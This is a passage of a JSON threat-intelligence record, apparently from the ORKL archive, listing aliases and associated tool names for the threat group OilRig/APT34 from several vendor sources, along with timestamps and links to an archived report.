                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "25896473-161f-411f-b76a-f11bb26c96bd",
            "created_at": "2023-01-06T13:46:38.75749Z",
            "updated_at": "2025-03-27T02:00:02.910627Z",
            "deleted_at": null,
            "main_name": "CHRYSENE",
            "aliases": [
                "Greenbug"
            ],
            "source_name": "MISPGALAXY:CHRYSENE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536094,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653698126,
    "ts_modification_date": 1653698126,
    "files": {
        "pdf": "https://archive.orkl.eu/824e416fd635fca278256256040bcb0b6c78a7d3.pdf",
        "text": "https://archive.orkl.eu/824e416fd635fca278256256040bcb0b6c78a7d3.txt",
        "img": "https://archive.orkl.eu/824e416fd635fca278256256040bcb0b6c78a7d3.jpg"
    }
}